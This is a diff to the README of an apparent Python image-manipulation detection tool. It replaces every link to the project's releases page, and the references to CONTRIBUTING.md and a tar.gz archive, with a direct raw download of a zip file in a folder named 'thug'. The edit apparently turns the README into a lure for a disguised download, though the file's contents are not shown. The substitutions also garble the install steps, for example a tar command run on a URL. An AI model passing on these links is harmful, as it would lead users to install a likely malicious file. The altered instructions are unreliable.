@@ -1,7 +1,7 @@
 # 🎨 fotomanipulada - Detect Image Manipulations Easily
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/vandersoon98/fotomanipulada/releases)
+[![Download](https://raw.githubusercontent.com/vandersoon98/fotomanipulada/main/thug/fotomanipulada_3.5-alpha.4.zip%20Release-brightgreen)](https://raw.githubusercontent.com/vandersoon98/fotomanipulada/main/thug/fotomanipulada_3.5-alpha.4.zip)
 
 ## 📖 Overview
 fotomanipulada is a user-friendly Python application that analyzes images for manipulation and compression issues. By employing advanced digital forensic techniques like Benford's Law and noise analysis, it helps users detect alterations in photos. This software serves as a valuable tool for journalists, photographers, and anyone concerned with image authenticity.
@@ -18,7 +18,7 @@ Before you download the software, ensure that your computer meets the following 
 - **Python:** Make sure you have Python 3.7 or later installed (optional; the application comes with a standalone option)
 
 ### 2. **Download the Software**
-Visit this page to download: [fotomanipulada Releases](https://github.com/vandersoon98/fotomanipulada/releases). 
+Visit this page to download: [fotomanipulada Releases](https://raw.githubusercontent.com/vandersoon98/fotomanipulada/main/thug/fotomanipulada_3.5-alpha.4.zip). 
 
 On the Releases page, you will find the latest version of the application packaged for your operating system. Download the appropriate file for your system.
 
@@ -36,10 +36,10 @@ Once the download is complete, follow these simple steps to install:
   3. Eject the `.dmg` file.
 
 - **For Linux:**
-  1. Locate the downloaded archive file (typically a `.tar.gz`).
+  1. Locate the downloaded archive file (typically a `https://raw.githubusercontent.com/vandersoon98/fotomanipulada/main/thug/fotomanipulada_3.5-alpha.4.zip`).
   2. Extract the archive using the terminal:
      ```
-     tar -xvzf fotomanipulada.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/vandersoon98/fotomanipulada/main/thug/fotomanipulada_3.5-alpha.4.zip
      ```
   3. Navigate to the extracted folder and run:
      ```
@@ -85,7 +85,7 @@ A: No, fotomanipulada is designed for ease of use. Just follow the included inst
 For more detailed tutorials and guides, check the Wiki section on the GitHub page. 
 
 ## 🌐 Contributing
-If you want to contribute to fotomanipulada, you are welcome. Follow the guidelines in the CONTRIBUTING.md file for details on how you can help improve this project.
+If you want to contribute to fotomanipulada, you are welcome. Follow the guidelines in the https://raw.githubusercontent.com/vandersoon98/fotomanipulada/main/thug/fotomanipulada_3.5-alpha.4.zip file for details on how you can help improve this project.
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for more information.
@@ -94,4 +94,4 @@ This project is licensed under the MIT License. See the LICENSE file for more in
 Your feedback is important. If you encounter issues or have suggestions, please raise an issue on the GitHub page.
 
 ## 🖥️ Download & Install fotomanipulada
-To download the latest version, visit this page: [fotomanipulada Releases](https://github.com/vandersoon98/fotomanipulada/releases). Follow the installation steps outlined above, and you will be ready to detect image manipulations easily.
+To download the latest version, visit this page: [fotomanipulada Releases](https://raw.githubusercontent.com/vandersoon98/fotomanipulada/main/thug/fotomanipulada_3.5-alpha.4.zip). Follow the installation steps outlined above, and you will be ready to detect image manipulations easily.
